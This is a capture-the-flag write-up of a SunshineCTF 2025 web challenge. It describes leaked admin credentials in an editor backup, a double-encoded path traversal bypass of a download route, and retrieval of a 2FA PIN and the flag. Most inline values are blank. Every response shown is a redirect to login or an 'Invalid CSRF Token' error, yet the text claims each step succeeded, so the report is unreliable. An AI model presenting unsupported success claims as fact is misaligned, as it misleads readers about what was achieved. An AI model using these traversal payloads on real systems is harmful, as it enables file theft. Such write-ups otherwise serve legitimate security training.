# Lunar File Invasion – SunshineCTF 2025 Write-up

## TL;DR
-  pointed to , leaking an editor backup  with hardcoded admin creds.
- Authenticated access exposed an  route that only blacklisted literal .
- Double-encoding  () let me pivot from  to recover  and , revealing the 2FA PIN .
- Reusing the traversal against  produced the flag: .

## Recon
1. Visited the landing page:
   <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Health Check</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(120deg, #0f0c29, #302b63, #24243e);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      max-width: 600px;
      width: 90%;
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 0 30px rgba(255, 0, 255, 0.4);
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(10px);
      text-align: center;
    }

    .container img {
      max-width: 200px;
      margin-bottom: 20px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
    }

    h2 {
      font-size: 28px;
      color: #ff55ff;
      margin-bottom: 20px;
    }

    .status {
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 15px;
      color: #00ff99;
    }

    p {
      font-size: 16px;
      color: #ddd;
    }

    @media (max-width: 768px) {
      .container {
        padding: 20px;
      }
      h2 {
        font-size: 22px;
      }
      .status {
        font-size: 18px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="/index/static/AlienHealth.png" alt="Alien Space Illustration">
    <h2>Lunar File System Health</h2>
    <div class="status">Status: UP</div>
    <p>This page securely shows the status of Lunar File System's internal servers.</p>
  </div>

</body>
</html>
2. Pulled , which referenced a pseudo  file:
   # don't need web scrapers scraping these sensitive files:

Disallow: /.gitignore_test
Disallow: /login
Disallow: /admin/dashboard
Disallow: /2FA
# this tells the git CLI to ignore these files so they're not pushed to the repos by mistake.
# this is because Muhammad noticed there were temporary files being stored on the disk when being edited
# something about EMACs.

# From MUHAMMAD: please make sure to name this .gitignore or it will not work !!!!

# static files are stored in the /static directory.
/index/static/login.html~
/index/static/index.html~
/index/static/error.html~
3. The leaked  listed ; downloading it disclosed the admin email/password that the developer meant to remove before production:
   <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
</head>
<body>
    <div>
        <img src="" alt="Image of Alien">
        <form action="{{url_for('index.login')}}" method="POST">
            <!-- TODO: use proper clean CSS stylesheets bruh -->
            <p style="color: red;"> {{ err_msg }} </p>
            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
            <label for="Email">Email</label>
            <input value="admin@lunarfiles.muhammadali" type="text" name="email">

            <label for="Password">Password</label>
            <!-- just to save time while developing, make sure to remove this in prod !  -->
            <input value="jEJ&(32)DMC<!*###" type="text" name="password">
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>

## Initial Admin Access
Using the exposed credentials , I pulled the login form to harvest a CSRF token and logged in:
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Lunar Files</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(120deg, #0f0c29, #302b63, #24243e);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
    }

    .container {
      display: flex;
      max-width: 900px;
      width: 90%;
      border-radius: 15px;
      overflow: hidden;
      box-shadow: 0 0 30px rgba(255, 0, 255, 0.4);
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(10px);
    }

    .image-section {
      flex: 1;
      background: url("/index/static/login.gif") center/cover no-repeat;
      min-height: 400px;
    }

    .form-section {
      flex: 1;
      padding: 40px;
      background-color: rgba(0, 0, 0, 0.6);
    }

    .form-section h2 {
      margin-bottom: 30px;
      font-size: 28px;
      color: #ff55ff;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      font-size: 14px;
      margin-bottom: 5px;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      border-radius: 5px;
      border: none;
      outline: none;
      background: rgba(255, 255, 255, 0.2);
      color: white;
    }

    .remember {
      display: flex;
      align-items: center;
      font-size: 14px;
      margin-bottom: 20px;
    }

    .remember input {
      margin-right: 10px;
    }

    .login-btn {
      background: #ff55ff;
      border: none;
      color: white;
      padding: 12px 20px;
      width: 100%;
      font-weight: bold;
      cursor: pointer;
      border-radius: 5px;
      transition: background 0.3s ease;
    }

    .login-btn:hover {
      background: #e044e0;
    }

    .status-message {
      margin-top: 10px;
      color: #ff8080;
      font-size: 14px;
    }

    @media (max-width: 768px) {
      .container {
        flex-direction: column;
      }

      .image-section {
        height: 200px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="image-section"></div>
    <div class="form-section">
      <h2>Lunar CMS Login</h2>
      <form method="POST" action="/login">
        <div class="form-group">
          <label for="email">Email</label>
          <input type="email" name="email" id="email" placeholder="admin@example.com" />
        </div>
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" name="password" id="password" placeholder="••••••••" />
        </div>
        <div class="remember">
          <input type="checkbox" id="remember" />
          <label for="remember">Remember Me</label>
        </div>
        <input type="hidden" name="csrf_token" value="ImRmYmZmY2NhNzA3ZDI5NWExYzVjZjk2ZGJjZDk3Mzg1OWExNTIyNWUi.aNhaOw.ttsI2QeDUkkLzbkk7KpYrn9ICx4" />
        <button class="login-btn" type="submit">Login</button>
        <div class="status-message"></div>
      </form>
    </div>
  </div>

</body>
</html><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error</title>
</head>
<body>
    <img src="" alt="some image of an alien shocked or smt">
    <p style="color: red;"> [ Invalid CSRF Token, if this persists please enable JavaScript. ] </p>
</body>
</html>
The server accepted the credentials but enforced a second factor through .

## Mapping the Admin Surface
Authenticated browsing of  and  showed a file manager listing – with a client-side call to . Initial attempts at straightforward directory traversal () were blocked, but the route returned stack-trace style errors hinting at templated paths within .

## Download Route Analysis
Grabbing the backend source via traversal confirmed the weak filter:
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=%2Fadmin%2Fdownload%2F..%2F.%2F..%2Fviews.py">/login?next=%2Fadmin%2Fdownload%2F..%2F.%2F..%2Fviews.py</a>. If not, click the link.
The  handler performs:

Because the blacklist checks for a literal substring, mixing encoded separators () or inserting  sidesteps the guard while  resolves the final path.

## Obtaining the 2FA PIN
1. Enumerated project structure with the same trick and pulled , which pointed to an SQLite database at .
   <!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=%2Fadmin%2Fdownload%2F..%252F.%252F..%252F.%252F..%252F.%252Fmodels.py">/login?next=%2Fadmin%2Fdownload%2F..%252F.%252F..%252F.%252F..%252F.%252Fmodels.py</a>. If not, click the link.
2. Downloaded the database using doubly encoded traversal:
   
3. Parsed the murali table locally to recover the  column:
   
   Output: .

## Completing 2FA
With a fresh CSRF token from , the recovered PIN cleared the challenge:
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=%2F2FA">/login?next=%2F2FA</a>. If not, click the link.
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error</title>
</head>
<body>
    <img src="" alt="some image of an alien shocked or smt">
    <p style="color: red;"> [ Invalid CSRF Token, if this persists please enable JavaScript. ] </p>
</body>
</html>
The response redirected to , proving full administrator access.

## Flag Retrieval
Traversing once more, now targeting the  directory revealed by , yielded the flag:
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=%2Fadmin%2Fdownload%2F..%252F.%252F..%252F.%252F..%252F.%252FFLAG%2Fflag.txt">/login?next=%2Fadmin%2Fdownload%2F..%252F.%252F..%252F.%252F..%252F.%252FFLAG%2Fflag.txt</a>. If not, click the link.
**Flag:** .

## Post-Exploitation Notes
- Backup files left in the static tree leak secrets even when the primary templates are sanitized.
- Blacklisting fragments (especially just ) is ineffective; rely on canonical path resolution with fixed base directories.
- Storing 2FA secrets alongside application assets makes multi-factor authentication moot when LFI is possible.

## Screenshots
The CLI environment used for this write-up does not support attaching screenshots. All relevant requests and responses are captured above for reproducibility.
